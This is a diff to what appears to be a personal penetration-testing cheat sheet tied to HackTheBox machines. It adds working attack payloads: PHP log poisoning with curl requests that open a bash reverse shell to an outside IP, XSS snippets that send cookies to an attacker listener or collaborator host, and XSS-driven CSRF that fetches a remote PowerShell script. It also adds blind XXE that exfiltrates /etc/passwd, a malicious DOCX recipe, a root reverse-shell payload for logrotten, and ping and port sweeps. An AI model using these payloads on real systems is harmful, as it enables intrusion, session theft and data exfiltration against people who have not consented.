@@ -48,7 +48,7 @@ root@kali:$ python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socke
 ```
 
 
-#### IPv6:
+#### IPv6
 
 ```
 root@kali:$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
@@ -138,6 +138,28 @@ user@remote:$ export TERM=xterm
 
 
 ## SMB
+
+
+### mount
+
+Mount:
+
+```
+root@kali:$ mount -t cifs //127.0.0.1/Users /mnt/smb -v -o user=snovvcrash,[pass=qwe123]
+```
+
+Status:
+
+```
+root@kali:~# mount -v | grep 'type cifs'
+root@kali:~# root@kali:~# df -k -F cifs
+```
+
+Unmount:
+
+```
+root@kali:~# umount /mnt/smb
+```
 
 
 ### impacket-smbserver
@@ -272,7 +294,7 @@ PS> . ./PowerView.ps1
 PS> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 
-1. [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
+1. [github.com/swisskyrepo/PayloadsAllTheThings/blob/master/krb_as_rep-roasting](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#krb_as_rep-roasting)
 
 
 ### DCSync
@@ -677,9 +699,39 @@ root@kali:$ service smbd restart
 root@kali:$ tail -f /var/log/samba/log.<HOSTNAME>
 ```
 
-1. [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
+* [www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)
 
 tags: *sniper.htb*
+
+
+### Log Poisoning
+
+#### PHP
+
+Access log (needs single `'` instead of double `"`):
+
+```
+root@kali:$ nc 127.0.0.1 80
+GET /<?php system($_GET['cmd']); ?>
+
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//access.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+Or
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//1&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+```
+
+Error log:
+
+```
+root@kali:$ curl -X POST 'http://127.0.0.1/vuln1.php' --form "userfile=@docx/sample.docx" --form 'submit=Generate pdf' --referer 'http://nowhere.com/<?php system($_GET["cmd"]); ?>'
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//var//log//apache2//error.log&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+Or
+root@kali:$ curl 'http://127.0.0.1/vuln2.php?id=....//....//....//....//....//proc//self//fd//2&cmd=%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.213%2F1337%200%3E%261%27'
+```
+
+* [medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)
+* [outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1)
+
+tags: *patents.htb*
 
 
 
@@ -747,17 +799,45 @@ id=1' UNION ALL SELECT LOAD_FILE('c:\\xampp\\htdocs\\admin\\db.php'),2,3-- -
 
 ## XSS
 
-### XMLHttpRequest
 
-#### LFI
+### Data Grabbers
+
+#### Cookies
+
+Img tag:
+
+```
+<img src="x" onerror="this.src='http://10.10.15.123/?c='+btoa(document.cookie)">
+```
+
+Fetch:
 
 ```javascript
-xhr = new XMLHttpRequest;
+<script>
+fetch('https://<SESSION>.burpcollaborator.net', {
+method: 'POST',
+mode: 'no-cors',
+body: document.cookie
+});
+</script>
+```
+
+* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+
+
+### XMLHttpRequest
+
+#### XSS to LFI
+
+```javascript
+<script>
+var xhr = new XMLHttpRequest;
 xhr.onload = function() {
 	document.write(this.responseText);
 };
 xhr.open("GET", "file:///etc/passwd");
 xhr.send();
+</script>
 ```
 
 ```
@@ -768,11 +848,12 @@ xhr.send();
 
 tags: *book.htb*
 
-#### RCE
+#### XSS to CSRF
 
-If and endpoint is accessible only from localhost:
+If the endpoint is accessible only from localhost:
 
 ```javascript
+<script>
 var xhr;
 if (window.XMLHttpRequest) {
 	xhr = new XMLHttpRequest();
@@ -782,9 +863,103 @@ if (window.XMLHttpRequest) {
 xhr.open("POST", "/backdoor.php");
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhr.send("cmd=powershell -nop -exec bypass -f  \\\\10.10.15.123\\share\\rev.ps1");
+</script>
 ```
 
 tags: *bankrobber.htb*
+
+With capturing CSRF token first:
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('GET', '/email', true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('POST', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@example.com')
+};
+</script>
+```
+
+* [portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+
+
+
+## XXE
+
+
+### Blind XXE OOB with External DTD
+
+Way 1 (general entities):
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY % xxe SYSTEM "http://10.10.14.253/ext.dtd">
+%xxe;
+%ext;
+]>
+<foo>&exfil;</foo>
+
+--- External file ext.dtd (hosted on local machine) ---
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % ext "<!ENTITY exfil SYSTEM 'http://10.10.14.253/?x=%file;'>">
+```
+
+Way 2 (parameter entities):
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY % xxe SYSTEM "http://10.10.14.253/ext.dtd">
+%xxe;
+]>
+<foo></foo>
+
+--- External file ext.dtd (hosted on local machine) ---
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % ext "<!ENTITY &#x25; exfil SYSTEM 'http://10.10.14.253/?x=%file;'>">
+%ext;
+%exfil;
+```
+
+* [portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
+* [www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/](https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/)
+* [media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)
+* [medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26](https://medium.com/@klose7/https-medium-com-klose7-xxe-attacks-part-1-xml-basics-6fa803da9f26)
+* [mohemiv.com/all/exploiting-xxe-with-local-dtd-files/](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
+
+
+### Malicious DOC/DOCX
+
+Get `docx` sample and unpack it:
+
+```
+root@kali:$ curl https://file-examples.com/wp-content/uploads/2017/02/file-sample_100kB.docx > sample.docx
+root@kali:$ unzip sample.docx
+```
+
+Create `customXml/` dir with a payload and pack it back:
+
+```
+root@kali:$ mkdir customXml
+root@kali:$ vi item1.xml
+...
+root@kali:$ rm malicious.docx; zip -r malicious.docx '[Content_Types].xml' customXml/ docProps/ _rels/ word/
+```
+
+* [file-examples.com/index.php/sample-documents-download/sample-doc-download/](https://file-examples.com/index.php/sample-documents-download/sample-doc-download/)
+* [stackoverflow.com/a/38797399/6253579](https://stackoverflow.com/a/38797399/6253579)
+
+tags: *patents.htb*
 
 
 
@@ -876,7 +1051,7 @@ $ gcc lr.c -o lr
 $ cat payloadfile
 if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi
 
-$ ./lr -p ./payload -t /home/reader/backups/access.log -d
+$ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
 ```
 
 * [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
@@ -968,6 +1143,24 @@ tags: *scavenger.htb*
 
 
 ## Enumeration
+
+
+### Ping Sweep
+
+```
+root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a sweep.txt &); done
+root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a sweep.txt &); done
+
+root@kali:$ sort -t'.' -k4,4n sweep.txt > pingsweep.txt && rm sweep.txt
+```
+
+### Echo Ports
+
+```
+root@kali:$ IP="10.10.10.173"; for p in $(seq 1 65535); do (echo '.' > /dev/tcp/$IP/$p && echo "$IP:$p" >> ports.txt &) 2>/dev/null; done
+
+root@kali:$ sort -t':' -k1,1n ports.txt > echoports.txt && rm ports.txt
+```
 
 
 ### Nmap
@@ -1565,7 +1758,9 @@ $ unix2dos input.txt
 
 ```
 $ netstat -anlp | grep LIST
+$ ss -nlpt | grep LIST
 ```
+
 
 ### Public IP
 
